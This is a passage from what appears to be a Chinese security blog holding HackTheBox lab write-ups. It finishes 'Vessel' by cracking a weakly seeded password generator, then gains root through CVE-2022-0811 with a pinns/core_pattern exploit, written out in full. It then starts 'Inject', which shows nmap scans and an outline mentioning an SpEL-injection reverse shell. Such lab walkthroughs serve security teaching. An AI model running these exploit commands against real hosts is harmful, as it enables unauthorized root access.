                self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setEchoMode<span class="token punctuation">(</span>QLineEdit<span class="token punctuation">.</span>Normal<span class="token punctuation">)</span>
            password <span class="token operator">=</span> self<span class="token punctuation">.</span>genPassword<span class="token punctuation">(</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>password<span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            msg <span class="token operator">=</span> QMessageBox<span class="token punctuation">(</span><span class="token punctuation">)</span>
            msg<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">'Warning'</span><span class="token punctuation">)</span>
            msg<span class="token punctuation">.</span>setText<span class="token punctuation">(</span><span class="token string">'Change the default values before generating passwords!'</span><span class="token punctuation">)</span>
            x <span class="token operator">=</span> msg<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">genPassword</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        length <span class="token operator">=</span> value
        char <span class="token operator">=</span> index
        <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
                charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
                    charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">try</span><span class="token punctuation">:</span>
                        qsrand<span class="token punctuation">(</span>QTime<span class="token punctuation">.</span>currentTime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>msec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        password <span class="token operator">=</span> <span class="token string">''</span>
                        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
                            idx <span class="token operator">=</span> qrand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span>
                            nchar <span class="token operator">=</span> charset<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>
                            password <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>nchar<span class="token punctuation">)</span>

                    <span class="token keyword">except</span><span class="token punctuation">:</span>
                        msg <span class="token operator">=</span> QMessageBox<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        msg<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">'Error'</span><span class="token punctuation">)</span>
                        msg<span class="token punctuation">.</span>setText<span class="token punctuation">(</span><span class="token string">'Error while generating password!, Send a message to the Author!'</span><span class="token punctuation">)</span>
                        x <span class="token operator">=</span> msg<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span>

                <span class="token keyword">return</span> password


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app <span class="token operator">=</span> QtWidgets<span class="token punctuation">.</span>QApplication<span class="token punctuation">(</span><span class="token punctuation">)</span>
    mainwindow <span class="token operator">=</span> MainWindow<span class="token punctuation">(</span><span class="token punctuation">)</span>
    mainwindow<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
    app<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># okay decompiling passwordGenerator.pyc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关键代码是下面的生成密码函数</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">genPassword</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        length <span class="token operator">=</span> value
        char <span class="token operator">=</span> index
        <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
                charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
                    charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">try</span><span class="token punctuation">:</span>
                        qsrand<span class="token punctuation">(</span>QTime<span class="token punctuation">.</span>currentTime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>msec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        password <span class="token operator">=</span> <span class="token string">''</span>
                        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
                            idx <span class="token operator">=</span> qrand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span>
                            nchar <span class="token operator">=</span> charset<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>
                            password <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>nchar<span class="token punctuation">)</span>

                    <span class="token keyword">except</span><span class="token punctuation">:</span>
                        msg <span class="token operator">=</span> QMessageBox<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        msg<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">'Error'</span><span class="token punctuation">)</span>
                        msg<span class="token punctuation">.</span>setText<span class="token punctuation">(</span><span class="token string">'Error while generating password!, Send a message to the Author!'</span><span class="token punctuation">)</span>
                        x <span class="token operator">=</span> msg<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span>

                <span class="token keyword">return</span> password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看到此函数恍然大悟，char=0就是<code>ALL Characters</code>，char=1是<code>Alphabetic</code>(字母)，char=2是<code>Alphanumeric</code>(字母数字)，那根据刚才看到的<code>screenshot.png</code>，合理推测第三行char=index=0，第二行length=value=32。根据password生成逻辑，charset有89个字符，每一位都从这89个字符中用qrand()随机一个，那么32位的password就有89的32次方种可能。但是<code>qsrand(QTime.currentTime().msec())</code>中的<code>.msec()</code>返回时间的毫秒部分，且范围是0-999，所以随机数种子只有1000种可能，可以爆破。</p>
<p>爆破脚本如下（由于Linux和Windows的python种Qt库可能不太一样，所以需在Windows下运行脚本，在Linux下运行会找不到pdf密码，而且<code>passwordGenerator</code>也是Windows程序）</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtCore <span class="token keyword">import</span> qsrand<span class="token punctuation">,</span> qrand

<span class="token keyword">def</span> <span class="token function">genPassword</span><span class="token punctuation">(</span>ms<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    length <span class="token operator">=</span> <span class="token number">32</span>
    charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'</span>

    qsrand<span class="token punctuation">(</span>ms<span class="token punctuation">)</span>
    password <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        idx <span class="token operator">=</span> qrand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span>
        nchar <span class="token operator">=</span> charset<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>
        password <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>nchar<span class="token punctuation">)</span>
    <span class="token keyword">return</span> password

passwords <span class="token operator">=</span> <span class="token punctuation">[</span>genPassword<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'generated.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>passwords<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>把刚生成的txt文件当作字典，用<code>pdfcrack</code>爆破，找到密码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# pdfcrack -f notes.pdf -w generated.txt
PDF version 1.6
Security Handler: Standard
V: 2
R: 3
P: -1028
Length: 128
Encrypted Metadata: True
FileID: c19b3bb1183870f00d63a766a1f80e68
U: 4d57d29e7e0c562c9c6fa56491c4131900000000000000000000000000000000
O: cf30caf66ccc3eabfaf371623215bb8f004d7b8581d68691ca7b800345bc9a86
found user-password: 'YG7Q7RDzA+q&amp;ke~MJ8!yRzoI^VQxSqSS'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>打开pdf文件如下</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327162031276.png" style="zoom:80%;">

<p>获得用户密码</p>
<pre class="line-numbers language-none"><code class="language-none">Ethan
b@mPRNSVTjjLKId1T<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ssh连上</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327162224496.png" style="zoom:80%;">

<p>用如下命令查询拥有suid权限的文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ find / -perm -u=s -type f 2&gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/mount
/usr/bin/su
/usr/bin/pinns<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后一个<code>/usr/bin/pinns</code>最可疑，google一下<code>pinns exploit</code>，看到如下文章</p>
<p><a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/">https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/</a></p>
<h2 id="七、CVE-2022-0811"><a href="#七、CVE-2022-0811" class="headerlink" title="七、CVE-2022-0811"></a>七、CVE-2022-0811</h2><p>漏洞产生的应用是CRI-O（一个基于Kubernetes的实时容器引擎），漏洞名称叫<code>cr8escape</code></p>
<p>在CRI-O版本1.19，pinns支持<code>sysctl</code>(system control)，即可以被用来设置内核参数值，而且不需要任何认证，命令格式如下</p>
<p>内核参数：<a href="https://docs.kernel.org/admin-guide/sysctl/kernel.html">https://docs.kernel.org/admin-guide/sysctl/kernel.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">pinns -s kernel_parameter1=value1+kernel_parameter2=value2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其中<code>kernel_parameter1</code>和<code>kernel_parameter2</code>是两个参数名，两个赋值语句中间用“+”连接，pinns只检查<code>kernel_parameter1</code>以确保是一个安全的内核参数，<code>kernel_parameter2</code>可以被设置为任意的内核参数</p>
<p>用如下命令查看CRI-O版本是1.19.6，属于漏洞覆盖范围</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ crio --version
crio version 1.19.6
Version:       1.19.6
GitCommit:     c12bb210e9888cf6160134c7e636ee952c45c05a
GitTreeState:  clean
BuildDate:     2022-03-15T18:18:24Z
GoVersion:     go1.15.2
Compiler:      gc
Platform:      linux/amd64
Linkmode:      dynamic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>参考上面crowdstrike的CVE分析文章，文章中用的内核参数是<code>kernel.shm_rmid_forced</code>和<code>kernel.core_pattern</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230328172027114.png" style="zoom:80%;">

<p><code>kernel.shm_rmid_forced=1</code>表示没有用户占用、且进程已被终止的共享内存段会被自动销毁</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230328171856037.png" style="zoom:80%;">

<p><code>kernel.core_pattern</code>的第一个字符如果是“|”，那么后面的字符串就会当作命令被执行</p>
<p>此处有个概念：内核转储（coredump），在进程发生问题时保存进程的运行状态</p>
<p>参考：<a href="https://www.jianshu.com/p/191a62f4f6b9?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation">https://www.jianshu.com/p/191a62f4f6b9?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></p>
<p>盘一盘逻辑：某一进程发生问题→触发内核转储→内核转储会根据<code>kernel.core_pattern</code>的设置确定存储信息的文件→<code>kernel.core_pattern</code>第一个字符“|”后的字符串会当作命令被执行</p>
<p>中间的部分操作系统自动处理不用管，只需要操作第一步和最后一步，即想办法让某一进程出问题，并且预先设置好<code>kernel.core_pattern</code>的值，便于执行命令</p>
<p>让某一进程出问题：可以用<code>kill</code>进程的方式实现</p>
<p>预先设置<code>kernel.core_pattern</code>的值：此处是pinns提供了修改内核参数的功能，所以用pinns去设置，格式如下</p>
<pre class="line-numbers language-none"><code class="language-none">pinns -s kernel_parameter1=value1+kernel_parameter2=value2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注：保证<code>kernel_parameter1=value1</code>是合法赋值，<code>kernel_parameter2</code>位置是<code>kernel.core_pattern</code>，<code>value2</code>位置是“|”开头，后面跟想要执行的命令或者脚本文件</p>
<p>于是用构造如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/exp.sh #'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>先查看想要修改的两个文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ cat /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced
|/usr/share/apport/apport %p %s %c %d %P %E
0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>执行构造好的命令，发现如下报错，并且查看目标文件，没有变化</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/exp.sh #'
[pinns:e]: Path for pinning namespaces not specified: Invalid argument<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>查看pinnx源码，发现报错的原因</p>
<p>pinns源码：<a href="https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c">https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c</a></p>
<p>发现如下两个逻辑代码段</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">option</span> long_options<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token punctuation">{</span><span class="token string">"help"</span><span class="token punctuation">,</span> no_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'h'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"uts"</span><span class="token punctuation">,</span> optional_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'u'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"ipc"</span><span class="token punctuation">,</span> optional_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'i'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"net"</span><span class="token punctuation">,</span> optional_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'n'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"user"</span><span class="token punctuation">,</span> optional_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'U'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"cgroup"</span><span class="token punctuation">,</span> optional_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'c'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"dir"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'d'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"filename"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'f'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"sysctl"</span><span class="token punctuation">,</span> optional_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'s'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pin_path<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">pexit</span><span class="token punctuation">(</span><span class="token string">"Path for pinning namespaces not specified"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">pexit</span><span class="token punctuation">(</span><span class="token string">"Filename for pinning namespaces not specified"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">directory_exists_or_create</span><span class="token punctuation">(</span>pin_path<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">nexitf</span><span class="token punctuation">(</span><span class="token string">"%s exists but is not a directory"</span><span class="token punctuation">,</span> pin_path<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>num_unshares <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">nexit</span><span class="token punctuation">(</span><span class="token string">"No namespace specified for pinning"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unshare</span><span class="token punctuation">(</span>unshare_flags<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">pexit</span><span class="token punctuation">(</span><span class="token string">"Failed to unshare namespaces"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>结合全部代码分析，整体要求就是：</p>
<p>1.要有<code>-d</code>参数，且参数值指定目录要存在或者可以被创建；</p>
<p>2.要有<code>-f</code>参数，参数值任意，但不能为空；</p>
<p>3.<code>-u -i -n -U</code>四个参数至少有一个（此处笔者只试了一个<code>-U</code>，理论上保证<code>num_unshares</code>不为0即可）。</p>
<p>重新构造，执行如下命令</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/dev/shm/exp.sh #' -f file -d /dev/shm -U
[pinns:e]: Failed to bind mount ns: /proc/self/ns/user: Operation not permitted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>虽有报错，但不影响，再次查看目标文件内容，修改成功</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ cat /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced
|/dev/shm/exp.sh #
1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>向<code>/dev/shm/exp.sh</code>写入想要执行的代码（此处就是把<code>/bin/bash</code>复制到<code>/tmp/wa0er</code>，并给予<code>4755</code>权限，也就是suid和755权限），并给<code>/dev/shm/exp.sh</code>添加执行权限</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ echo -e '#!/bin/bash\ncp /bin/bash /tmp/wa0er\nchown root:root /tmp/wa0er\nchmod 4755 /tmp/wa0er' | tee /dev/shm/exp.sh
#!/bin/bash
cp /bin/bash /tmp/wa0er
chown root:root /tmp/wa0er
chmod 4755 /tmp/wa0er

ethan@vessel:~$ chmod +x /dev/shm/exp.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行sleep命令，并用<code>killall</code>终止进程，<code>-s SIGSEGV</code>表示访问未分配给自己的内存，此处可看到回显(core dumped)，即进入内核转储</p>
<pre class="line-numbers language-none"><code class="language-none">ethan@vessel:~$ sleep 100&amp;
[1] 1676

ethan@vessel:~$ killall -s SIGSEGV sleep
[1]+  Segmentation fault      (core dumped) sleep 100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查看<code>/tmp/wa0er</code>文件权限，已有suid权限</p>
<pre class="line-numbers language-none"><code class="language-none">ethan@vessel:~$ ls -l /tmp/wa0er
-rwsr-xr-x 1 root root 1183448 Mar 27 13:07 /tmp/wa0er<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>执行<code>/tmp/wa0er -p</code>提权，成功获取root权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327211815596.png"></p>
<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327210944263.png" style="zoom: 67%;">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_45894840/article/details/127844085">https://blog.csdn.net/qq_45894840/article/details/127844085</a></p>
<p><a href="https://0xdf.gitlab.io/2023/03/25/htb-vessel.html">https://0xdf.gitlab.io/2023/03/25/htb-vessel.html</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>git信息泄露</tag>
        <tag>Nodejs-SQL注入</tag>
        <tag>Python反编译</tag>
        <tag>CVE-2022-24637（OpenWebAnalytics）</tag>
        <tag>CVE-2022-0811（内核提权）</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Inject</title>
    <url>/posts/89e1a3f1.html</url>
    <content><![CDATA[<h1 id="HTB-Inject"><a href="#HTB-Inject" class="headerlink" title="HTB-Inject"></a>HTB-Inject</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><ol>
<li>端口扫描发现8080页面存在上传点；</li>
<li>上传文件路径存在本地文件包含；</li>
<li>本地文件包含读取站点<code>pom.xml</code>文件发现Spring Cloud Function版本存在SpEL注入；</li>
<li>SpEL注入反弹shell获取<code>frank</code>用户权限；</li>
<li><code>frank</code>用户目录信息泄露获取<code>phil</code>用户；</li>
<li><code>phil</code>用户自动任务<code>Ansible Playbook</code>提权获取root权限。</li>
</ol>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>Nmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# nmap -p- --min-rate 10000 10.10.11.204 
Starting Nmap 7.91 ( https://nmap.org ) at 2023-04-03 02:45 EDT
Nmap scan report for 10.10.11.204
Host is up (7.6s latency).
Not shown: 53331 filtered ports, 12202 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 49.25 seconds

┌──(root💀kali)-[~/Desktop]
└─# nmap -sCV -p 22,8080 10.10.11.204
Starting Nmap 7.91 ( https://nmap.org ) at 2023-04-03 02:50 EDT
Nmap scan report for 10.10.11.204
Host is up (0.37s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
